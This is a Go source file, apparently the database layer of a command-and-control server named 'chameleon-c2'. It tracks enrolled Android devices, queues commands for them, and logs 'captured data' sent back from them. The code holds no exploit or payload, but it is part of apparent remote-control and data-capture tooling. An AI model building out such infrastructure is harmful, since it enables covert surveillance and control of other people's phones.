package db

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"time"

	_ "github.com/mattn/go-sqlite3"

	"github.com/your-org/chameleon-c2/internal/types"
)

type Store struct {
	db *sql.DB
}

func New(dbPath string) (*Store, error) {
	db, err := sql.Open("sqlite3", dbPath+"?_journal_mode=WAL&_busy_timeout=5000")
	if err != nil {
		return nil, fmt.Errorf("open db: %w", err)
	}

	if err := db.Ping(); err != nil {
		return nil, fmt.Errorf("ping db: %w", err)
	}

	store := &Store{db: db}
	if err := store.migrate(); err != nil {
		return nil, fmt.Errorf("migrate: %w", err)
	}

	return store, nil
}

func (s *Store) Close() error {
	return s.db.Close()
}

func (s *Store) migrate() error {
	queries := []string{
		`CREATE TABLE IF NOT EXISTS devices (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			device_id TEXT UNIQUE NOT NULL,
			device_name TEXT,
			manufacturer TEXT,
			model TEXT,
			android_version TEXT,
			api_level INTEGER,
			ip_address TEXT,
			status TEXT DEFAULT 'online',
			screen_state TEXT DEFAULT 'unknown',
			first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
			last_seen DATETIME DEFAULT CURRENT_TIMESTAMP
		)`,
		`CREATE TABLE IF NOT EXISTS command_queue (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			command_id TEXT UNIQUE NOT NULL,
			device_id TEXT NOT NULL,
			command TEXT NOT NULL,
			params TEXT,
			status TEXT DEFAULT 'pending',
			created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
			executed_at DATETIME,
			result TEXT
		)`,
		`CREATE INDEX IF NOT EXISTS idx_commands_device ON command_queue(device_id)`,
		`CREATE INDEX IF NOT EXISTS idx_commands_status ON command_queue(status)`,
		`CREATE TABLE IF NOT EXISTS captured_data_log (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			device_id TEXT NOT NULL,
			data_type TEXT NOT NULL,
			summary TEXT,
			received_at DATETIME DEFAULT CURRENT_TIMESTAMP
		)`,
		`CREATE INDEX IF NOT EXISTS idx_data_device ON captured_data_log(device_id)`,
	}

	for _, q := range queries {
		if _, err := s.db.Exec(q); err != nil {
			return fmt.Errorf("exec %q: %w", q[:40], err)
		}
	}

	// Add screen_state column if not exists (backward compat)
	s.db.Exec(`ALTER TABLE devices ADD COLUMN screen_state TEXT DEFAULT 'unknown'`)

	return nil
}

func (s *Store) RegisterDevice(info types.DeviceInfo) error {
	_, err := s.db.Exec(`
		INSERT INTO devices (device_id, device_name, manufacturer, model, android_version, api_level, ip_address)
		VALUES (?, ?, ?, ?, ?, ?, ?)
		ON CONFLICT(device_id) DO UPDATE SET
			device_name = excluded.device_name,
			manufacturer = excluded.manufacturer,
			model = excluded.model,
			android_version = excluded.android_version,
			api_level = excluded.api_level,
			ip_address = excluded.ip_address,
			status = 'online',
			last_seen = CURRENT_TIMESTAMP
	`, info.DeviceID, info.DeviceName, info.Manufacturer, info.Model, info.AndroidVersion, info.APiLevel, info.IPAddress)
	return err
}

func (s *Store) UpdateScreenState(deviceID, state string) error {
	_, err := s.db.Exec(`UPDATE devices SET screen_state = ? WHERE device_id = ?`, state, deviceID)
	return err
}

func (s *Store) UpdateHeartbeat(deviceID string) error {
	_, err := s.db.Exec(`UPDATE devices SET last_seen = CURRENT_TIMESTAMP, status = 'online' WHERE device_id = ?`, deviceID)
	return err
}

func (s *Store) SetDeviceOffline(deviceID string) error {
	_, err := s.db.Exec(`UPDATE devices SET status = 'offline' WHERE device_id = ?`, deviceID)
	return err
}

func (s *Store) GetDevice(deviceID string) (*types.Device, error) {
	row := s.db.QueryRow(`
		SELECT id, device_id, device_name, manufacturer, model, android_version,
		       COALESCE(api_level, 0), COALESCE(ip_address, ''), status, COALESCE(screen_state, 'unknown'), first_seen, last_seen
		FROM devices WHERE device_id = ?
	`, deviceID)

	var d types.Device
	err := row.Scan(&d.ID, &d.DeviceID, &d.DeviceName, &d.Manufacturer, &d.Model,
		&d.AndroidVersion, &d.APiLevel, &d.IPAddress, &d.Status, &d.ScreenState, &d.FirstSeen, &d.LastSeen)
	if err != nil {
		return nil, err
	}
	return &d, nil
}

func (s *Store) ListDevices() ([]types.Device, error) {
	rows, err := s.db.Query(`
		SELECT id, device_id, device_name, manufacturer, model, android_version,
		       COALESCE(api_level, 0), COALESCE(ip_address, ''), status, COALESCE(screen_state, 'unknown'), first_seen, last_seen
		FROM devices ORDER BY last_seen DESC
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var devices []types.Device
	for rows.Next() {
		var d types.Device
		if err := rows.Scan(&d.ID, &d.DeviceID, &d.DeviceName, &d.Manufacturer, &d.Model,
			&d.AndroidVersion, &d.APiLevel, &d.IPAddress, &d.Status, &d.ScreenState, &d.FirstSeen, &d.LastSeen); err != nil {
			return nil, err
		}
		devices = append(devices, d)
	}
	return devices, nil
}

func (s *Store) EnqueueCommand(deviceID string, cmd types.CommandMessage) error {
	paramsJSON := ""
	if cmd.Params != nil {
		paramsJSON = string(cmd.Params)
	}
	_, err := s.db.Exec(`
		INSERT INTO command_queue (command_id, device_id, command, params, status)
		VALUES (?, ?, ?, ?, 'pending')
	`, cmd.CommandID, deviceID, cmd.Command, paramsJSON)
	return err
}

func (s *Store) GetPendingCommands(deviceID string) ([]types.CommandMessage, error) {
	rows, err := s.db.Query(`
		SELECT command_id, command, COALESCE(params, '')
		FROM command_queue
		WHERE device_id = ? AND status = 'pending'
		ORDER BY id ASC
	`, deviceID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var commands []types.CommandMessage
	for rows.Next() {
		var cmd types.CommandMessage
		var paramsStr string
		if err := rows.Scan(&cmd.CommandID, &cmd.Command, &paramsStr); err != nil {
			return nil, err
		}
		if paramsStr != "" {
			cmd.Params = json.RawMessage(paramsStr)
		}
		commands = append(commands, cmd)
	}
	return commands, nil
}

func (s *Store) UpdateCommandStatus(commandID, status, result string) error {
	_, err := s.db.Exec(`
		UPDATE command_queue SET status = ?, result = ?, executed_at = CURRENT_TIMESTAMP
		WHERE command_id = ?
	`, status, result, commandID)
	return err
}

func (s *Store) LogDataReceived(deviceID, dataType, summary string) error {
	_, err := s.db.Exec(`
		INSERT INTO captured_data_log (device_id, data_type, summary) VALUES (?, ?, ?)
	`, deviceID, dataType, summary)
	return err
}

func (s *Store) MarkOfflineDevices(timeout time.Duration) error {
	_, err := s.db.Exec(`
		UPDATE devices SET status = 'offline'
		WHERE last_seen < datetime('now', ?)
	`, fmt.Sprintf("-%d seconds", int(timeout.Seconds())))
	return err
}
